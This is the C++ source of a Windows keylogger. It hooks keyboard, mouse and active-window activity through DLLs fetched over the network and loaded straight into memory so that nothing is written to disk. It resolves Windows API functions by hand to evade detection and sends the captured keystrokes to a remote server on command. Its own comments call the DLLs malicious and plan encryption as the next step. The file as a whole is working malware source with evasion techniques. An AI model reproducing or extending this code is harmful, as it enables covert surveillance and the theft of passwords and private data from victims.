//cl /EHsc .\keylogger.cpp .\MemoryModule.c /link ws2_32.lib user32.lib /OUT:keylogger.exe
/*

    uses the network_lib to send and receive data
    hooks the keyboard and mouse to log keystrokes and mouse clicks
    logs the keystrokes and mouse clicks to a file
    sends the log file to the server when requested

    !! will need the  network_lib.dll and others in the same directory as the executable   !!

    make the malicious dlls to load from memory [done]
    now no files are written to the disk    [done]
    dynamic api resolution [doing]
    use encrypted dlls next
*/

#include <windows.h>
#include <iostream>
#include <string>
#include <sstream>
#include <mutex>
#include <vector>
#include "MemoryModule.h"

/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

LPCSTR dllPath_n = "network_lib.dll";
HMEMORYMODULE hDLL_k, hDLL_m, hDLL_w;
HINSTANCE hDLL_n;

//------------------------------------------------------------------------------------------------------------------------------

typedef HMODULE(WINAPI *LoadLibraryAFn)(LPCSTR);
LoadLibraryAFn MyLoadLibraryA;

typedef FARPROC(WINAPI *CustomGetProcAddress)(HMODULE, LPCSTR);
CustomGetProcAddress myGetProcAddress;

typedef HMODULE(WINAPI *FreeLibraryFn)(HMODULE);
FreeLibraryFn MyFreeLibrary;

typedef int (*SendDataFunc)(const std::string&, const std::string&);
typedef std::string (*RecvDataFunc)(const std::string&);
typedef std::vector<unsigned char> (*RecvDataRawFunc)(const std::string&);
SendDataFunc send_data;
RecvDataFunc receive_data;
RecvDataRawFunc receive_data_raw;

//==============================================================================================================================

typedef void(*InitializeFunc)(std::vector<std::string>*);
typedef void(*CleanupFunc)();
InitializeFunc init_active_window, init_mouse, init_keyboard;
CleanupFunc cleanup_aw, cleanup_m, cleanup_kb;

//------------------------------------------------------------------------------------------------------------------------------

bool running = true;
std::vector<std::string> shared_vector;

/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

int load_dlls();
BOOL CtrlHandler(DWORD fdwCtrlType);
void* FindExportAddress(HMODULE hModule, const char* funcName);

/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

int main(int argc, char* argv[])
{

    HMODULE hKernel32 = (HMODULE)GetModuleHandleA("kernel32.dll");

    MyLoadLibraryA = (LoadLibraryAFn)FindExportAddress(hKernel32, "LoadLibraryA");
    myGetProcAddress = (CustomGetProcAddress)FindExportAddress(hKernel32, "GetProcAddress");
    MyFreeLibrary = (FreeLibraryFn)FindExportAddress(hKernel32, "FreeLibrary");

    std::atomic<bool> receivedTerminationSignal(false);
    
    if (load_dlls() != 0)return 1;

    // Set the console control handler
    if (!SetConsoleCtrlHandler(CtrlHandler, TRUE))
    {
        std::cerr << "Error setting console control handler" << std::endl;
        return 1;
    }

    init_active_window(&shared_vector);
    init_keyboard(&shared_vector);
    init_mouse(&shared_vector);

    std::thread terminationCheckThread([&]()
    {
        while (true)
        {
            std::string a = receive_data("klogger_cmd.txt");
            if (a[0] == 's')
            {
                receivedTerminationSignal = true;
                send_data("klogger_cmd.txt","`");

                std::ostringstream oss;
                for (const auto& entry : shared_vector) oss << entry;
                send_data("key_strokes.txt",oss.str());

                cleanup_kb();
                cleanup_m();
                cleanup_aw();
                break; 
            }
            std::this_thread::sleep_for(std::chrono::milliseconds(100)); 
        }
    });
    
    // Main thread continues to process Windows messages
    MSG msg;
    while (!receivedTerminationSignal)
    {
        if (PeekMessage(&msg, NULL, 0, 0, PM_NOREMOVE)) std::this_thread::sleep_for(std::chrono::milliseconds(10));
        {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    }

    terminationCheckThread.join();

    MyFreeLibrary(hDLL_n);
    MemoryFreeLibrary(hDLL_k);
    MemoryFreeLibrary(hDLL_m);
    MemoryFreeLibrary(hDLL_w);

    return 0;
}

void* FindExportAddress(HMODULE hModule, const char* funcName)
{
    // Access the PE headers of the loaded module
    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)hModule;
    IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)((BYTE*)hModule + dosHeader->e_lfanew);

    // Get the export directory
    IMAGE_EXPORT_DIRECTORY* exportDir = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)hModule + ntHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);

    // Get the list of function names and addresses
    DWORD* nameRVAs = (DWORD*)((BYTE*)hModule + exportDir->AddressOfNames);
    WORD* ordRVAs = (WORD*)((BYTE*)hModule + exportDir->AddressOfNameOrdinals);
    DWORD* funcRVAs = (DWORD*)((BYTE*)hModule + exportDir->AddressOfFunctions);

    // Search through the list of function names
    for (DWORD i = 0; i < exportDir->NumberOfNames; ++i)
    {
        char* funcNameFromExport = (char*)((BYTE*)hModule + nameRVAs[i]);
//std::cout << "Checking " << funcNameFromExport << std::endl;
        if (strcmp(funcNameFromExport, funcName) == 0)
        {
            DWORD funcRVA = funcRVAs[ordRVAs[i]];
            return (void*)((BYTE*)hModule + funcRVA);

        }
    }
    return nullptr;

}

int load_dlls()                                             // loads the dlls from the disk
{

    hDLL_n = MyLoadLibraryA(dllPath_n);
    if (hDLL_n == nullptr)
    {
        std::cerr << "Failed to load DLL: " << GetLastError() << std::endl;
        return EXIT_FAILURE;
    }

    receive_data_raw = (RecvDataRawFunc)myGetProcAddress(hDLL_n, "?receive_data_raw@@YA?AV?$vector@EV?$allocator@E@std@@@std@@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@@Z");
    receive_data = (RecvDataFunc)myGetProcAddress(hDLL_n, "?receive_data@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEBV12@@Z");
    send_data = (SendDataFunc)myGetProcAddress(hDLL_n, "?send_data@@YAHAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@0@Z");
    if (!receive_data || !send_data || !receive_data_raw)
    {
        std::cerr << "Failed to get one or more function addresses for network dll.\n";
        FreeLibrary(hDLL_n);
        return 1;
    }

    //------------------------------------------------------------------------------------------------------------------------------

    std::vector<unsigned char> dll_k, dll_m, dll_w;

    dll_k = receive_data_raw("keylog_k_lib.dll");
    dll_m = receive_data_raw("keylog_m_lib.dll");
    dll_w = receive_data_raw("keylog_w_lib.dll");

    //------------------------------------------------------------------------------------------------------------------------------

    hDLL_k = MemoryLoadLibrary(dll_k.data(), dll_k.size());
    if (hDLL_k == NULL)
    {
        std::cerr << "Failed to load DLL from memory.\n";
        return 1;
    }

    init_keyboard = (InitializeFunc)MemoryGetProcAddress(hDLL_k, "?Initialize@@YAXPEAV?$vector@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@V?$allocator@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@std@@@Z");
    cleanup_kb = (CleanupFunc)MemoryGetProcAddress(hDLL_k, "?Cleanup@@YAXXZ");
    if (!init_keyboard || !cleanup_kb)
    {
        std::cerr << "Failed to get one or more function addresses for keyboard dll.\n";
        MemoryFreeLibrary(hDLL_k);
        return 1;
    }

    // //------------------------------------------------------------------------------------------------------------------------------

    hDLL_m = MemoryLoadLibrary(dll_m.data(), dll_m.size());
    if (hDLL_m == NULL)
    {
        std::cerr << "Failed to load DLL from memory.\n";
        return 1;
    }

    init_mouse = (InitializeFunc)MemoryGetProcAddress(hDLL_m, "?Initialize@@YAXPEAV?$vector@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@V?$allocator@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@std@@@Z");
    cleanup_m = (CleanupFunc)MemoryGetProcAddress(hDLL_m, "?Cleanup@@YAXXZ");
    if (!init_mouse || !cleanup_m)
    {
        std::cerr << "Failed to get one or more function addresses for mouse dll.\n";
        MemoryFreeLibrary(hDLL_m);
        return 1;
    }

    // //------------------------------------------------------------------------------------------------------------------------------

    hDLL_w = MemoryLoadLibrary(dll_w.data(), dll_w.size());
    if (hDLL_w == NULL)
    {
        std::cerr << "Failed to load DLL from memory.\n";
        return 1;
    }

    init_active_window = (InitializeFunc)MemoryGetProcAddress(hDLL_w, "?Initialize@@YAXPEAV?$vector@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@V?$allocator@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@std@@@Z");
    cleanup_aw = (CleanupFunc)MemoryGetProcAddress(hDLL_w, "?Cleanup@@YAXXZ");
    if (!init_active_window || !cleanup_aw)
    {
        std::cerr << "Failed to get one or more function addresses for init_active_window dll.\n";
        MemoryFreeLibrary(hDLL_w);
        return 1;
    }

    //------------------------------------------------------------------------------------------------------------------------------

    return 0;
}

BOOL CtrlHandler(DWORD fdwCtrlType)
{
    switch (fdwCtrlType)
    {
        case CTRL_C_EVENT:
        case CTRL_BREAK_EVENT:
        case CTRL_CLOSE_EVENT:
        case CTRL_LOGOFF_EVENT:
        case CTRL_SHUTDOWN_EVENT:
            
            running = false;
            
            cleanup_kb();
            cleanup_m();
            cleanup_aw();

            MyFreeLibrary(hDLL_n);
            MemoryFreeLibrary(hDLL_k);
            MemoryFreeLibrary(hDLL_m);
            MemoryFreeLibrary(hDLL_w);

            return TRUE; // Indicate that the signal was handled
        default:
            return FALSE;
    }
}

